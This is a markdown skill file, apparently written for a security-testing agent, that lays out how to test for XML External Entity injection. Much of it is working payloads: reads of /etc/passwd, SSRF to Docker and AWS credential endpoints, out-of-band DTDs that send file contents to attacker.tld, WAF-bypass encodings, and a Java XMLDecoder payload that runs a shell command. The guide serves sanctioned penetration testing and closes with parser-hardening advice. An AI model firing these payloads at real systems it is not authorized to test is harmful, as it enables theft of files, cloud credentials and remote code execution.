---
name: xxe
description: XXE testing for external entity injection, file disclosure, and SSRF via XML parsers
---

# XXE

XML External Entity injection is a parser-level failure that enables local file reads, SSRF to internal control planes, denial-of-service via entity expansion, and in some stacks, code execution through XInclude/XSLT or language-specific wrappers. Treat every XML input as untrusted until the parser is proven hardened.

## Attack Surface

**Capabilities**
- File disclosure: read server files and configuration
- SSRF: reach metadata services, internal admin panels, service ports
- DoS: entity expansion (billion laughs), external resource amplification

**Injection Surfaces**
- REST/SOAP/SAML/XML-RPC, file uploads (SVG, Office)
- PDF generators, build/report pipelines, config importers

**Transclusion**
- XInclude and XSLT `document()` loading external resources

## High-Value Targets

**File Uploads**
- SVG/MathML, Office (docx/xlsx/ods/odt), XML-based archives
- Android/iOS plist, project config imports

**Protocols**
- SOAP/XML-RPC/WebDAV/SAML (ACS endpoints)
- RSS/Atom feeds, server-side renderers and converters

**Hidden Paths**
- Parameters: "xml", "upload", "import", "transform", "xslt", "xsl", "xinclude"
- Processing-instruction headers

## Detection Channels

### Direct

- Inline disclosure of entity content in the HTTP response, transformed output, or error pages

### Error-Based

- Coerce parser errors that leak path fragments or file content via interpolated messages

### OAST

- Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
- Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)

### Timing

- Fetch slow or unroutable resources to produce measurable latency differences (connect vs read timeouts)

## Core Payloads

### Local File

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r>&xxe;</r>
```

### SSRF

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI">]>
<r>&xxe;</r>
```

### OOB Parameter Entity

```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://attacker.tld/evil.dtd"> %dtd;]>
```

evil.dtd:
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://%f;.attacker.tld/'>">
%e; %exfil;
```

## Key Vulnerabilities

### Parameter Entities

- Use parameter entities in the DTD subset to define secondary entities that exfiltrate content
- Works even when general entities are sanitized in the XML tree

### XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

Effective where entity resolution is blocked but XInclude remains enabled in the pipeline.

### XSLT Document

XSLT processors can fetch external resources via `document()`:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-stylesheet PI consumers.

### Protocol Wrappers

- Java: `jar:`, `netdoc:`
- PHP: `php://filter`, `expect://` (when module enabled)
- Gopher: craft raw requests to Redis/FCGI when client allows non-HTTP schemes

## Bypass Techniques

**Encoding Variants**
- UTF-16/UTF-7 declarations, mixed newlines
- CDATA and comments to evade naive filters

**DOCTYPE Variants**
- PUBLIC vs SYSTEM, mixed case `<!DoCtYpE>`
- Internal vs external subsets, multi-DOCTYPE edge handling

**Network Controls**
- If network blocked but filesystem readable, pivot to local file disclosure
- If files blocked but network open, pivot to SSRF/OAST

## Special Contexts

### SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

### SAML

- Assertions are XML-signed, but upstream XML parsers prior to signature verification may still process entities/XInclude
- Test ACS endpoints with minimal probes

### SVG and Renderers

- Inline SVG and server-side SVG→PNG/PDF renderers process XML
- Attempt local file reads via entities/XInclude

### Office Docs

- OOXML (docx/xlsx/pptx) are ZIPs containing XML
- Insert payloads into document.xml, rels, or drawing XML and repackage

## Testing Methodology

1. **Inventory consumers** - Endpoints, upload parsers, background jobs, CLI tools, converters, third-party SDKs
2. **Capability probes** - Does parser accept DOCTYPE? Resolve external entities? Allow network access? Support XInclude/XSLT?
3. **Establish oracle** - Error shape, length/ETag diffs, OAST callbacks
4. **Escalate** - Targeted file/SSRF payloads
5. **Validate parity** - Same parser options must hold across REST, SOAP, SAML, file uploads, and background jobs

## Validation

1. Provide a minimal payload proving parser capability (DOCTYPE/XInclude/XSLT)
2. Demonstrate controlled access (file path or internal URL) with reproducible evidence
3. Confirm blind channels with OAST and correlate to the triggering request
4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths)
5. Bound impact: exact files/data reached or internal targets proven

## False Positives

- DOCTYPE accepted but entities not resolved and no transclusion reachable
- Filters or sandboxes that emit entity strings literally (no IO performed)
- Mocks/stubs that simulate success without network/file access
- XML processed only client-side (no server parse)

## Impact

- Disclosure of credentials/keys/configs, code, and environment secrets
- Access to cloud metadata/token services and internal admin panels
- Denial of service via entity expansion or slow external resources
- Code execution via XSLT/expect:// in insecure stacks

## Pro Tips

1. Prefer OAST first; it is the quietest confirmation in production-like paths
2. When content is sanitized, use error-based and length/ETag diffs
3. Probe XInclude/XSLT; they often remain enabled after entity resolution is disabled
4. Aim SSRF at internal well-known ports (kubelet, Docker, Redis, metadata) before public hosts
5. In uploads, repackage OOXML/SVG rather than standalone XML; many apps parse these implicitly
6. Keep payloads minimal; avoid noisy billion-laughs unless specifically testing DoS
7. Test background processors separately; they often use different parser settings
8. Validate parser options in code/config; do not rely on WAFs to block DOCTYPE
9. Combine with path traversal and deserialization where XML touches downstream systems
10. Document exact parser behavior per stack; defenses must match real libraries and flags

## Summary

XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.


## Additional Techniques — ported from WebSkills (xxe-test)

### Parser default-risk by stack

Whether XXE works depends entirely on the parser and its config. Triage accordingly:

| Stack | Common parser(s) | Default risk |
|-------|------------------|--------------|
| Java | `DocumentBuilderFactory`, `SAXParser`, `XMLInputFactory`, `TransformerFactory`, JAXB | Historically vulnerable by default; XInclude/parameter entities often work |
| PHP | `libxml` (`simplexml_load_*`, `DOMDocument`) | `libxml_disable_entity_loader` mattered pre-PHP 8; `php://filter`/`expect://` are PHP gadgets |
| .NET | `XmlDocument`, `XmlReader`, `XmlTextReader` | Vulnerable when `DtdProcessing=Parse`/`ProhibitDtd=false` on older versions |
| Python | `lxml`, `xml.etree`, `xml.sax` | `lxml` resolves entities/external DTDs by config; `defusedxml` is the fix |
| Ruby | `Nokogiri`, REXML | `Nokogiri` needs `NOENT` to expand; usually safe-by-default — check |
| Go | `encoding/xml` | Does NOT resolve external entities (generally XXE-safe) — note when triaging |

### Highest-yield move: content-type swap to XML

Take any JSON or form endpoint, switch `Content-Type` to `application/xml` (also try `text/xml`, `application/soap+xml`, `application/*+xml`) and send an equivalent XML body with an injected DOCTYPE. Many frameworks (Jackson XML, Spring, ASP.NET) will parse it even though the documented content-type was JSON:

```http
POST /api/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY cat "Tom"> ]>
<user><name>&cat;</name></user>
```
Start with a benign reflected entity (`Tom`) to prove entity expansion before escalating.

### Error-based XXE (no OOB channel)

When there is no reflection and no outbound network, leak file contents inside a parser error. Host this as your external DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
The parser tries to open `file:///nonexistent/<contents>` and echoes the failed path — including the file content — in its error message. Note: `&#x25;` is the hex ref for `%`, required so the inner entity is declared at parse time, not when the DTD is first read.

### CDATA wrapper for multi-line / XML-breaking files

Multi-line files or files containing `<`/`&` corrupt inline substitution. Wrap them in CDATA via an external DTD:

Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/WEB-INF/web.xml">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://attacker:8000/wrapper.dtd">
%dtd;
]>
```
`wrapper.dtd`:
```xml
<!ENTITY wrapper "%start;%file;%end;">
```
(For PHP source, prefer `php://filter/read=convert.base64-encode/resource=...` — base64 is XML-safe.)

### Filter-bypass catalogue (pick by what's blocked)

- **`SYSTEM` blocked** → use `PUBLIC`: `<!ENTITY xxe PUBLIC "id" "file:///etc/passwd">`
- **`ENTITY` keyword blocked** → case (`<!EnTiTy>`), or numeric/hex char refs for the letters: `<!&#69;&#78;&#84;&#73;&#84;&#89; xxe SYSTEM "...">`
- **Keyword string filters** → split with a comment: `<!EN<!-- -->TITY ...>`
- **URI inspected** → smuggle it as base64 via `data://`: `<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;` (decodes to `file:///etc/passwd`)
- **Byte-signature WAF** → change document `encoding=` to UTF-7 / UTF-16 / UTF-32 (with BOM); many upstream filters don't decode it but the parser does.

Recommended order: PUBLIC-vs-SYSTEM → parameter entities → external-DTD chaining → mixed case → numeric/hex char refs → `data:`/base64 → UTF-7 → UTF-16/32 → comment-splitting → double encoding.

### XXE → RCE chains

| Path | Requirement | Trigger |
|------|-------------|---------|
| Log poisoning | Log readable via `file://` AND executed in a code context (usually needs an LFI include sink) | Inject `<?php ...?>` into a logged field, read+execute the log |
| SSRF → creds | XXE→SSRF reaches AWS metadata / internal CI | Read `169.254.169.254/.../security-credentials/ROLE` → IAM creds → SSM/RunCommand |
| Java deserialization | XML deserialized into objects (`XMLDecoder`, `XStream`) | See payload below |
| PHP `expect://` | `expect` extension loaded | `<!ENTITY xxe SYSTEM "expect://id">` |
| Shellshock | Vulnerable Bash reachable via CGI over XXE-driven SSRF | `() { :; };` payload in header to internal CGI |
| OOB delivery | Confirmed outbound + a second-stage sink | External DTD returns a deserialization gadget |

Java `XMLDecoder` RCE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="1">
      <void index="0"><string>/bin/sh -c id</string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```
